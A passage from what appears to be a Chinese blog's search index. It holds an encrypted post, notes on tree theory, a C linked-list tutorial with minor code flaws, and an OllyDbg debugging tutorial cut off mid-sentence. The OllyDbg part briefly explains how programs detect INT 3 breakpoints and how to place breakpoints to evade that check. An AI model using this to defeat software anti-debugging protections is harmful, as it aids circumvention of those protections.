b1a8ede5b22be5782f9e851804645dffeac1d4cecf42b527c6d0e3743dd0e91d3b395391a8fd97c215d3240d1109c83e9ba93c13f3dfcbae79ad773aabb738f68c9e0dd64b8a7f9166840672e35cb7cfd91adfd085a5a0aea6fdd387ffc73cb21fdd4a60ef1fc28631c51a000f244b102e583445ecb813f63de2ff2dc5e6dc5e3b2b1ab4d06fa3e3ad404bbfd63942f8c36b91524cc4dac32b960609e4f3ff3c7c3121ab9320c05fe7300c6e20141357d9af69db7aa6ea11f755af2ffbe923d1f5d9dd0b45c608748ed6b895aad310a55cf16e1a602fb25663f1a45c52a3b58717dba13b451b274f3dc9ccee6810506fdeb3c29480053507267f96e33878b488913e13765c016cc3b20536846184b04ac6668d65f439f81598b66c19c21398839066c8d7a9c8d6d7c53af12c6a656eb30e0dba98f8937b888d85a1db284550c91dcc941e6721a48f72ec78b1a295f7a3547bcec0d7df740360450b190c4b59f622187ca751277b57c22d65ed56bfbb44eed0ce89325897d265c2f8da78593da35273d8773ec8ca1b0e4111d64fcb3c9d489d420625f532730bf7359e9b2d908841ae3508d6de16520e1e3907a1c9d77e07018fdf59836de9b66ff750732188bc518894a6f84c190409e0cecfccd13338ba4f6f5cead905d078c9a5f3813bafe4cdfc8dfb0b4cd9f8cf9932b7890bc88ad935165700317f9b23f3af2013db9c61d20d2ecdb82f05d5e52a4019836e2490f750bd052d7da971ac12b7392079fe108124ea12813a339a0075115cc8f57db4d40bac99119f91c7a4b7e6da5632492cd4c390eaeb496736919383f34ef37bc6a061f1ed5b0a047b77b812b2ff6e99ab797b89fb4989df1d081694addc9c08066a27a9928dbc98055f5371e1cdf612659a30210031e2d8d16ab7097ef4fe2f2bb0dbcc73fe686c25a3a1ee6f83ad59095db824e61763f842dab375f821e37ef042149bad88d98a8b24374b53ed929c021cbeb94601a6f8c193031be41cda7eca836110d99bae0598fc5f20ab59f07b2917972d3c721bd980ce84b7ebbff1fef30aae69ee82b82bc205f32f324dfb1382f8d5cd7e6702f98bd61769e80ead71b51bbc88d7c828151efa0647b6970705ccfb0fc37cdc2ec3bdd81f24fdac8164719b151b9047d23fb36cd9e05a30fabf7b95498d45c54b641f7392c2b35d058e8b98421fdbc39dfd4242c4d4b902ff7533a1dac37a500a20b9c416d509c69846124182f79d3a676e6648b2c9aed9207234b424f87ccd223d5e81eac8d3d8a3c7fe91bfb205c3a3473f14c9d4be8e9c57e4a8c72bb33fdaff732c3905f937fc02bb5dd37ffbaad57981bacf1a5d29571493dab630a7c243dbe792818942e01dc42b012764f85b5f30f1206471315a9cc2d9139d5c7751a35e357290d8d45cb47a496cdfd8845c780951d8b45b1dc0a14439e373362660e7a31bdcc30f9a24aa6747c085bf08870146de4e5f3a421f3bc4c42351f05d7905d8c9097de7a3ff42097e5e7fed7845e1aeb9670e186f756068928877e7f86aa0618daf30bbc1da4e8c5e4a676e7fc4b5d8c8a07596fa617ab4c048c6b9c36889389024306bbb642c060e46219d2b10c25c65ab9f5d63682f4a6d6712c37bd843410e1eb19d8b280d2fbd414eab2fe39748520f5fceb3da8341cbf73733d21c5684bddceab0a4c5b42a1330219995c4c7c0b9442eb25c77df05749e89d3eb71f5b738eea8139bc3e8f8a264e00d00be38619219bc5273375a91dcaea25dacf8f906a0118b7bfcc445c3f870dd5669e5d886ba76ea127a14d665fb78521f6bd100c5cd8dcf6972388acb950ba5ac98a27fb9c91dcf4b1798f84776f38674815d129a00884bb11826dcd19a88eedf37c36b6c9b71d03c7ceeef2b45939d65d0f655d7e8227e3858f019895ec3ebd4139720efa929074c9d928045f0a35e1ced67c13419e5f58c2e25617a371e98a72151e9aa8b5c4363ae049a0b92da2df0e1e7590055f950c67bf6720aa3ccecc2207cf135c0a516a29aeca2e2f2d594c2a340e0c949aa98e4fcda60aae858ec502ff3faf40bfbc90cd4c848cdce0613bd39ec822fd04e2166439681c566b33ee2d432bbe2d07c19c014327c132184adb1c6e2507fb8932cc06ee0ab774447cf512353240cda53c4fd256661a62d190b514f1c9302259620cb47110fb9b5807a459962ec3d29a5bfb47437ebb8e7885d2d387f6a5710c487469969b8e9637b082460996a39e21da6a229408c040a840d3332ef1ffa5f5d3c6ce627adab33dcef6edb0d8997e61becdba904b873868fcd67b61fbf407808840102c7e9ea8e0e9f3d2fadc1e761840f2db3b5315e01a38c9131636f15edcb36ef46f4a85f19e53314f930ce7cae586de00cbd815e3d4b799a9782edd72f360848a309dc3054dc5f124585a0f4e62fd3cf54f6f16e1a3f4f5e45a66fcc267a24723f81c13b4040d0308478c16cde16ed95cb91e20e7557c138101d08a9162532b8925614b092131cce6aebccd0ec064b634e05b18a2a1b64</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树的常见概念及公式</title>
      <link href="/20248f216d97b28c/"/>
      <url>/20248f216d97b28c/</url>
      
        <content type="html"><![CDATA[<h1 id="基本概念">基本概念</h1><h2 id="树的定义">树的定义</h2><p>在图论中,树是一种无向图,其中任意两个顶点间存在一条唯一路径.</p><p>换句话说,没有环的连通图就是树.并且树有层次关系,其有且仅有一个根节点.</p><p>如果一个无向简单图G满足如下关系,那么G是一棵树:</p><ul><li>G是没有环的连通图</li><li>G内添加一条边则会形成一个环</li><li>G删除一条边则不再联通</li><li>G中任意2个顶点间存在唯一路径</li></ul><p>与线性表不同,树是一种非线性的结构,并且各顶点(数据项)间有一定的层次关系,一个顶点有着0个或若干个子顶点.</p><h3 id="各结点的关系">各结点的关系</h3><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240108191132338.png" alt="image-20240108191132338" style="zoom:33%;" /><h2 id="森林">森林</h2><p>森林是m(m&gt;=0)棵互不相交的树的集合.</p><p>每棵树去掉其根节点后,剩下的部分即若干个子树,构成一个森林.</p><h2 id="常见属性">常见属性</h2><ol><li><p>结点的度</p><p>一个节点含有的子树的个数称为该节点的度</p></li><li><p>树的度</p><p>一棵树中,最大的结点的度称为树的度,例如二叉树的度为2</p></li><li><p>树的高度(定义不统一)</p><p>高度从下向上数,即该节点到叶子结点的最长路径(边数)+1,叶子结点的高度为<code>1</code></p></li><li><p>树的深度(定义不统一)</p><p>深度从上向下数,即从树根到该节点的路径(边数)+1,树根的深度为<code>1</code></p></li></ol><h1 id="常用公式">常用公式</h1><h2 id="一般的树">一般的树</h2><ol><li><code>总结点数 = 总度数 + 1</code></li></ol><h2 id="二叉树">二叉树</h2><ol><li><p>第i层有<code>2^(k-1)</code>个结点(k&gt;=1)</p></li><li><p>深度为m的二叉树最多有<code>2^m-1</code>个结点,最少有<code>m</code>个节点</p><p>最多时为<code>满二叉树</code>,最少时退化为<code>单链表</code></p></li><li><p>任意一颗二叉树,叶子结点数为<code>N0</code>,度为2结点数为<code>N2</code>,则<code>N0 = N2 + 1</code></p><p>证明: 度为1的结点数为<code>N1</code>,总结点数为<code>N</code>,则<code>N=N0+N1+N2</code>,又<code>总度数=N1*1+N2*2</code>,且<code>N=总度数+1</code>,联立即可得出.</p></li><li><p>具有<code>n</code>个结点的<code>完全二叉树</code>,其深度为<code>[log2(n)]+1</code>,其中<code>[log2(n)]</code>为向下取整</p></li><li><p>具有<code>n</code>个结点的<code>满二叉树</code>,其深度为<code>log2(n+1)</code>或<code>[log2(n)]+1</code></p></li><li><p>对完全二叉树从上到下,从左到右从1依次编号,第<code>i</code>个结点的父亲是<code>[i/2]</code>,左孩子是<code>2*i</code>,右孩子是<code>2*i+1</code></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 数据结构 </tag>
            
            <tag> 树论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机类大一学生如何入门</title>
      <link href="/2024736475e7a83d/"/>
      <url>/2024736475e7a83d/</url>
      
        <content type="html"><![CDATA[<p>// 正在施工…</p>]]></content>
      
      
      <categories>
          
          <category> 琐碎想法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链表</title>
      <link href="/20230c0d63870c20/"/>
      <url>/20230c0d63870c20/</url>
      
        <content type="html"><![CDATA[<h1 id="概述">概述</h1><h2 id="线性表">线性表</h2><p><code>线性表</code>是由n(n≥0)个数据元素(结点) :a[0],a[1],a[2],…,a[n-1]组成的<code>有限序列</code>.</p><p>一个<code>数据元素</code>可以由若干个<code>数据项</code>组成.<code>数据元素</code>称为<code>记录</code>,而含有大量<code>记录</code>的线性表又称为<code>文件</code>.</p><p>线性表满足如下特点:</p><ul><li>存在一个唯一的没有前驱的(头)数据元素.(注意与具体实现中的&quot;头结点&quot;有别)</li><li>存在一个唯一的没有后继的(尾)数据元素.</li><li>除此之外,其他每一个数据元素均有一个直接前驱和一个直接后继数据元素.</li></ul><p>说简单的,就是一堆数据排成单独的一列,这就是<code>线性表</code>.</p><h2 id="链表">链表</h2><p>根据存储的方式不同,常规的线性表分为<code>顺序表</code>和<code>链表</code>.</p><p>所谓<code>顺序表</code>就是各个结点(元素)在内存中紧挨着存储,本质相当于一个数组:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240306170538627.png" alt="image-20240306170538627" style="zoom:50%;" /><p>而所谓<code>链表</code>,其各个结点都是分散的,因此必须使用指针来进行&quot;串联&quot;,形成一个链式结构,下图是其<code>逻辑结构</code>:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240306165216730.png" alt="image-20240306165216730" style="zoom:50%;" /><p>但是一般情况下,各个结点的存储空间都是<code>动态分配</code>的,因此实际上他们的<code>物理分布</code>类似这样:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240306170719517.png" alt="image-20240306170719517" style="zoom:50%;" /><p>即每个结点的位置是随机的,也因此各个结点间必须使用指针(指针域)(即图中的箭头)来进行链接,以保证能够正确访问和有序性.</p><h3 id="链表的时间复杂度">链表的时间复杂度</h3><p>由于每个节点是离散的,因此无法像<code>顺序表(数组)</code>那样使用&quot;下标&quot;进行&quot;随机访问&quot;,只能从表的开始(表头)逐个向后查找,最终定位到指定的结点.</p><p>因此,可以知道,链表的各个基本操作的时间复杂度:</p><ul><li>插入结点到下标k(已定位到该位置): <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></li><li>删除节点到下标k(已定位到该位置): <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></li><li>访问(查找)某个节点: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></li></ul><h1 id="实现">实现</h1><p>链表ADT需要实现如下基本的操作:</p><ul><li>创建一个空链表</li><li>销毁一个链表</li><li>从表头插入一个元素(头插)</li><li>从表头删除一个元素</li><li>从下标为i处插入一个元素</li><li>删除下标为i的元素</li></ul><p>使用C语言来实现该ADT.</p><p>ADT:抽象数据结构—解决代码的复用性—写好的轮子—拿来直接用就好.</p><h2 id="linked-list-h">linked_list.h</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @file: linked_list.h</span></span><br><span class="line"><span class="comment"> * @description: This is a head file for linked list ADT</span></span><br><span class="line"><span class="comment"> * @author: WAHAHA</span></span><br><span class="line"><span class="comment"> * @note: without head node</span></span><br><span class="line"><span class="comment"> * @Date: 2024-03-06 17:45:06</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2024-03-06 22:01:33</span></span><br><span class="line"><span class="comment"> * @FilePath: \data-structure\ADT_linked_list\linked_list.h</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _LINKED_LIST_H_ <span class="comment">// 宏保护,防止重复包含头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _LINKED_LIST_H_</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* bool macro */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> status; <span class="comment">// 标准C语言没有bool类型,需要有一个平替</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRUE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FALSE 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* data type */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType; <span class="comment">// 数据元素类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">list_node_s</span> &#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_node_s</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; <span class="type">list_node_t</span>, **<span class="type">list_t</span>; <span class="comment">// 链表节点类型,链表类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* function declaration */</span></span><br><span class="line"><span class="type">list_node_t</span> *<span class="title function_">new_list</span><span class="params">(<span class="type">void</span>)</span>; <span class="comment">// 创建一个新的链表</span></span><br><span class="line">status <span class="title function_">free_list</span><span class="params">(<span class="type">list_t</span>)</span>; <span class="comment">// 销毁链表</span></span><br><span class="line"></span><br><span class="line">status <span class="title function_">list_insert_head</span><span class="params">(<span class="type">list_t</span>, ElemType)</span>; <span class="comment">// 头插法插入元素</span></span><br><span class="line">status <span class="title function_">list_remove_head</span><span class="params">(<span class="type">list_t</span>)</span>; <span class="comment">// 头删除法删除元素</span></span><br><span class="line"></span><br><span class="line">status <span class="title function_">list_insert_at</span><span class="params">(<span class="type">list_t</span>,ElemType,<span class="type">int</span>)</span>; <span class="comment">// 在指定位置插入元素</span></span><br><span class="line">status <span class="title function_">list_remove_at</span><span class="params">(<span class="type">list_t</span>,<span class="type">int</span>)</span>; <span class="comment">// 删除指定位置的元素</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// _LINKED_LIST_H_</span></span></span><br></pre></td></tr></table></figure><h2 id="linked-list-c">linked_list.c</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @file: linked_list.c</span></span><br><span class="line"><span class="comment"> * @description: Linked list implementation</span></span><br><span class="line"><span class="comment"> * @author: WAHAHA</span></span><br><span class="line"><span class="comment"> * @Date: 2024-03-06 17:45:25</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2024-03-06 22:57:58</span></span><br><span class="line"><span class="comment"> * @FilePath: \data-structure\ADT_linked_list\linked_list.c</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> typedef int ElemType; // 数据元素类型</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> typedef struct list_node_s &#123;</span></span><br><span class="line"><span class="comment">     ElemType data;</span></span><br><span class="line"><span class="comment">     struct list_node_s *next;</span></span><br><span class="line"><span class="comment"> &#125; list_node_t, *list_t; // 链表节点类型,链表类型</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linked_list.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">list_node_t</span> *<span class="title function_">new_list</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>; <span class="comment">// 改为仅有头指针</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">status <span class="title function_">free_list</span><span class="params">(<span class="type">list_t</span> <span class="built_in">list</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">list</span> == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    <span class="type">list_node_t</span> *cur = *<span class="built_in">list</span>, *temp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        temp = cur;</span><br><span class="line">        cur = cur-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    *<span class="built_in">list</span> = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">status <span class="title function_">list_insert_head</span><span class="params">(<span class="type">list_t</span> <span class="built_in">list</span>, ElemType value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">list</span> == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    <span class="comment">// 构造结点</span></span><br><span class="line">    <span class="type">list_node_t</span> *new_node = (<span class="type">list_node_t</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">list_node_t</span>));</span><br><span class="line">    new_node-&gt;data = value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重定向指针</span></span><br><span class="line">    new_node-&gt;next = *<span class="built_in">list</span>;</span><br><span class="line">    *<span class="built_in">list</span> = new_node;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">status <span class="title function_">list_remove_head</span><span class="params">(<span class="type">list_t</span> <span class="built_in">list</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">list_node_t</span> *temp = *<span class="built_in">list</span>;</span><br><span class="line">    *<span class="built_in">list</span> = temp-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(temp);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">status <span class="title function_">list_insert_at</span><span class="params">(<span class="type">list_t</span> <span class="built_in">list</span>, ElemType value, <span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">list</span> == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入到下标i处,就意味着pre要指向下标(i-1)的节点</span></span><br><span class="line">    <span class="comment">// pre初始是0,则意味着循环需要0,1,2,...,i-1 共i-1次</span></span><br><span class="line">    <span class="type">list_node_t</span> *pre = *<span class="built_in">list</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; index - <span class="number">1</span>;++i) &#123;</span><br><span class="line">        pre = pre-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 此时pre指向结点i-1</span></span><br><span class="line">    <span class="comment">// 构造结点</span></span><br><span class="line">    <span class="type">list_node_t</span> *new_node = (<span class="type">list_node_t</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">list_node_t</span>));</span><br><span class="line">    new_node-&gt;data = value;</span><br><span class="line">    <span class="comment">// 插入到链表</span></span><br><span class="line">    <span class="comment">// 第一步</span></span><br><span class="line">    new_node-&gt;next = pre-&gt;next;</span><br><span class="line">    <span class="comment">// 第二步</span></span><br><span class="line">    pre-&gt;next = new_node;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line">status <span class="title function_">list_remove_at</span><span class="params">(<span class="type">list_t</span> <span class="built_in">list</span>, <span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">list</span> == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    <span class="type">list_node_t</span> *pre = *<span class="built_in">list</span>;</span><br><span class="line">    <span class="comment">// 遍历扫描,index-1次</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; index - <span class="number">1</span>;++i) &#123;</span><br><span class="line">        pre = pre-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 重定向指针</span></span><br><span class="line">    <span class="type">list_node_t</span> *temp = pre-&gt;next;</span><br><span class="line">    pre-&gt;next = pre-&gt;next-&gt;next;</span><br><span class="line">    <span class="comment">// 释放内存</span></span><br><span class="line">    <span class="built_in">free</span>(temp);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="test-c">test.c</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linked_list.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">list_node_t</span> *head = new_list();</span><br><span class="line">    <span class="type">int</span> arr[] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">5</span>;++i) &#123;</span><br><span class="line">        list_insert_head(&amp;head, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">list_node_t</span> *cur=head;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">5</span>;++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d]:%d &quot;</span>,i,cur-&gt;data);</span><br><span class="line">        cur=cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    free_list(&amp;head);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OLLYDBG的学习和使用</title>
      <link href="/202337bfbb7e9cc5/"/>
      <url>/202337bfbb7e9cc5/</url>
      
        <content type="html"><![CDATA[<h1 id="常用快捷键">常用快捷键</h1><p>F2: 设置断点</p><p>F7: 单步跳入</p><p>F8: 单步跳过</p><p>Ctrl+F7: 可视化反复单步跳入</p><p>Ctrl+F8: 可视化反复单步跳过</p><p>Ctrl+F11: 不可视反复单步跳入</p><p>Ctrl+F12: 不可视反复单步跳过</p><p>F9: 跳出(?)</p><p>F4: 运行到光标处</p><p>Ctrl+N: 打开动态链接库的函数表(导入表)</p><p>​此时就可以输入函数名来查找,找到后回车即可跳转到代码.</p><p>Alt+M: 查看内存</p><p>Alt+L: 打开&quot;Log data&quot;窗口</p><h1 id="界面按钮">界面按钮</h1><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240309141444837.png" alt="image-20240309141444837" style="zoom:90%;" /><h2 id="c按钮">C按钮</h2><p>将<code>反汇编面板</code>的光标定位到当前的IP指针处.</p><h2 id="b按钮">B按钮</h2><p>打开<code>断点窗口</code>,查看断点明细</p><h2 id="w按钮">W按钮</h2><p>列出窗口相关的参数.</p><h1 id="常用断点">常用断点</h1><h2 id="int-3-软中断">INT 3-软中断</h2><p>该指令机器码为<code>0xCC</code>,因此也常被称为&quot;CC指令&quot;,被调试进程执行到INT 3指令时导致一个异常时,调试器就会捕获该异常,从而停在断点处,然后将断点处的指令恢复成原来的指令.</p><p>优点是可以下无数个断点.</p><p>缺点是改变了机器码,容易被检测到,例如有些软件会检测API的首地址是否为0xCC,以此来判断是否被下断点.</p><p>用C语言来检测的话,方法是:取得检测函数的地址,然后读取其第一个字节,判断是否为0xCC.</p><p>躲过检测的方法是将断点设在函数内部或末尾.</p><h2 id="硬件断点">硬件断点</h2><p>硬件断点和<code>DRx调试寄存器</code>有关:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240309145150922.png" alt="image-20240309145150922" style="zoom:50%;" /><p>DRx调试寄存器共有8个(DR0~DR7),区别如下:</p><ul><li>DR0~DR7: 调试地址寄存器,用于保存需要监视的地址,例如设置硬件断点.</li><li>DR4~DR5: 保留,未公开具体用途.</li><li>DR6: 